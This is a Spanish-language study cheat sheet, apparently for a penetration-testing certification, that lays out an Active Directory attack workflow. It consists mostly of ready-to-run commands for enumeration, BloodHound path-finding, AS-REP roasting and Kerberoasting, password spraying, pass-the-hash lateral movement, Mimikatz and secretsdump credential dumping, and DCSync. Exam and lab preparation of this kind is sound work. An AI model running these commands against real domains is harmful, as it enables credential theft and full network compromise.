# 6. Active Directory (40 puntos — prioridad alta)

Flujo típico: foothold en máquina 1 → dump de creds → enumerar con BloodHound → Kerberoast/AS-REP → movimiento lateral → DC → DCSync.

## Enumeración con credenciales (aunque sean de bajo privilegio)
```bash
nxc smb <DC_IP> -u <USER> -p <PASS> --users
nxc smb <DC_IP> -u <USER> -p <PASS> --groups
nxc smb <SUBNET>/24 -u <USER> -p <PASS>        # valida/spray en toda la red
nxc smb <DC_IP> -u <USER> -p <PASS> --shares

# Enumeración externa (sin creds)
impacket-rpcclient -U "" -N <IP>
impacket-samrdump <DOMAIN>/<USER>:<PASS>@<IP>
```

## Enumeración nativa desde dentro (RDP + herramientas de Windows)

> No siempre vas a poder correr `nxc`/`impacket`/`bloodhound-python` limpio desde Kali (firewalls que solo dejan pasar RDP, por ejemplo). Este es tu plan B: conéctate por RDP con las credenciales del breach scenario y enumera con las herramientas nativas de Windows desde dentro.

```bash
# Conectarse por RDP a un cliente del dominio con credenciales ya obtenidas
xfreerdp /u:<USER> /d:<DOMAIN> /v:<IP_CLIENTE> +clipboard
# Te pedirá la contraseña interactivamente, o pásala con /p:<PASS>
```

Una vez dentro (cmd o PowerShell), enumeración con herramientas **legacy** de Windows:
```cmd
:: Info del dominio y del usuario actual
whoami /all
echo %USERDOMAIN%
systeminfo | findstr /B /C:"Domain"

:: Usuarios y grupos DEL DOMINIO (no locales de la máquina)
net user /domain
net user <USUARIO> /domain          :: detalle de un usuario específico
net group /domain
net group "Domain Admins" /domain   :: miembros de un grupo específico

:: Usuarios y grupos LOCALES de la máquina actual (¡distinto a lo de arriba!)
net user                            :: cuentas locales de ESTA máquina, no del dominio
net localgroup administrators       :: admins locales de la máquina actual

:: Controladores de dominio
nltest /dclist:<DOMAIN>

:: Confianzas de dominio
nltest /domain_trusts
```
> **Ojo con la confusión `net user` vs `net user /domain`:** sin `/domain` te muestra las cuentas LOCALES de la máquina en la que estás parado (ej: si buscas un usuario "security" y no aparece con `/domain`, puede ser una cuenta local de otra máquina, no del dominio — verifica con `dir C:\Users` en esa máquina específica).

```powershell
# PowerShell nativo (sin necesitar módulos externos como PowerView)
Get-ADUser -Filter * -Properties *              # si el módulo AD de RSAT está disponible
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()   # requiere PowerShell, NO funciona en cmd.exe
```

## BloodHound (te dibuja el camino a Domain Admin — casi obligatorio)
```bash
# Recolección remota desde Kali
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c all --zip
# OJO: es -d (domain), NO -g (global catalog) — error común que rompe la resolución DNS
# --zip es específico de BloodHound CE (la versión moderna); omítelo si usas Legacy

# O SharpHound en la máquina Windows comprometida (o dentro de tu sesión RDP)
.\SharpHound.exe -c All
```
Sube el `.zip` a la interfaz web de BloodHound CE (`http://localhost:8080`, botón de upload/nube). Busca tu usuario inicial, revisa sus edges salientes, y usa la pestaña **PATHFINDING** poniendo tu usuario como Start Node y "DOMAIN ADMINS@<DOMINIO>" como End Node — es más simple que depender del botón "Mark as Owned" (la interfaz de Cypher de BloodHound CE bloquea consultas de escritura como `SET`, así que no se puede marcar Owned por Cypher).

**Ojo con la dirección de la flecha:** si ves un edge tipo "GenericAll" pero apunta DESDE Domain Admins HACIA tu usuario (no al revés), eso es la relación normal de "los admins administran esta cuenta" — NO es un camino explotable para ti. Verifica siempre el sentido de la flecha antes de asumir que un edge es tu vector.

## Ataques Kerberos — NO CONFUNDIR ESTOS DOS COMANDOS

> **Son las dos técnicas más fáciles de confundir en todo AD.** Antes de correr cualquiera, pregúntate: ¿estoy probando "no requiere autenticación previa" (AS-REP) o "tiene un SPN de servicio" (Kerberoast)? Son vulnerabilidades DISTINTAS en cuentas DISTINTAS.

```bash
# ── AS-REP Roasting ──
# Comando: impacket-GetNPUsers  (NP = "No Preauth")
# Ataca cuentas con "Do Not Require Pre-Authentication" = TRUE
# NO necesita password válido de antemano si usas -usersfile con -no-pass
# Verifica en BloodHound el campo "Do Not Require Pre-Authentication" antes de intentarlo
impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -request
# → crackear con: hashcat -m 18200

# ── Kerberoasting ──
# Comando: impacket-GetUserSPNs  (SPN = "Service Principal Name")
# Ataca cuentas de SERVICIO que tienen un SPN configurado (típicamente cuentas
# con nombres como SVC_*, cuentas de aplicaciones, SQL, IIS, etc.)
# SÍ necesitas credenciales válidas de dominio de antemano (aunque sean de bajo privilegio)
# Verifica en BloodHound si el nodo tiene el ícono/flag de "Kerberoastable"
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
# → crackear con: hashcat -m 13100
```
**Regla mental rápida:** `GetNPUsers` = "N"o autenticación previa. `GetUserSPNs` = "SPN" de servicio. Si el nombre de la cuenta suena a cuenta de servicio (`SVC_algo`), casi siempre es Kerberoasting (`GetUserSPNs`) lo que quieres probar primero, no AS-REP.

## Password spraying (¡cuidado con lockout!)
```bash
nxc smb <SUBNET>/24 -u users.txt -p 'Password123'
```

## Movimiento lateral (con creds o hash) — ELIGE SEGÚN EL PUERTO ABIERTO

> **Antes de elegir herramienta, confirma qué puerto está abierto** (`nmap -p445,5985,5986 <IP>`). Usar la herramienta equivocada para el puerto cerrado da un error de conexión que puede confundirse con credenciales incorrectas.

```bash
# Si 5985/5986 (WinRM) está ABIERTO → evil-winrm (shell PowerShell, más cómoda)
evil-winrm -i <IP> -u <USER> -p <PASS>
evil-winrm -i <IP> -u <USER> -H <NT_HASH>          # Pass-the-Hash

# Si 5985 está CERRADO pero 445 (SMB) está abierto → impacket-psexec o wmiexec
impacket-psexec  <DOMAIN>/<USER>:<PASS>@<IP>       # shell cmd.exe, crea un servicio (más "ruidoso")
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>       # shell cmd.exe, vía WMI (más discreto)

# Pass-the-Hash (funciona con cualquiera de los anteriores, cambia -p por -hashes/-H)
impacket-psexec <DOMAIN>/<USER>@<IP> -hashes <LM>:<NT>
nxc smb <IP> -u <USER> -H <NT_HASH>
```
**Si ves `Errno::ECONNREFUSED` en el puerto 5985 con evil-winrm:** ese puerto está cerrado en el target — cambia inmediatamente a `impacket-psexec`/`wmiexec` sobre el 445, no sigas reintentando evil-winrm.

## Dump de credenciales
```bash
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
nxc smb <IP> -u <USER> -p <PASS> --sam --lsa

# Mimikatz (en la máquina)
sekurlsa::logonpasswords
lsadump::sam
```

## Escalada a Domain Admin
```bash
# DCSync (si tienes derechos de replicación)
impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<DC_IP>
```
También: abuso de ACLs (BloodHound), delegaciones, Pass-the-Ticket.

> Recordatorio de reglas: Responder solo en modo análisis, **nunca poisoning**. Metasploit no para pivotar (ver 7-Pivoting).

---

## Comandos de Windows fáciles de confundir con Linux (post-explotación)

```cmd
:: En cmd.exe de Windows, NO uses "cat" — usa:
type C:\ruta\archivo.txt

:: Para inspeccionar bytes exactos si "type" muestra caracteres raros (útil si
:: una flag "no es aceptada" por posibles caracteres invisibles al copiar):
certutil -encodehex C:\ruta\archivo.txt tmp.hex
type tmp.hex

:: "ls" no es nativo de cmd.exe (aunque algunas shells lo aceptan como alias) — usa:
dir
```

---

Ver también: **6b-AD-Edges-Metodologia.md** — el plan de arranque con `nxc`/`Pwn3d!`, la tabla de edges de BloodHound, y el orden de priorización de caminos (ACL > Kerberos > Sesión).
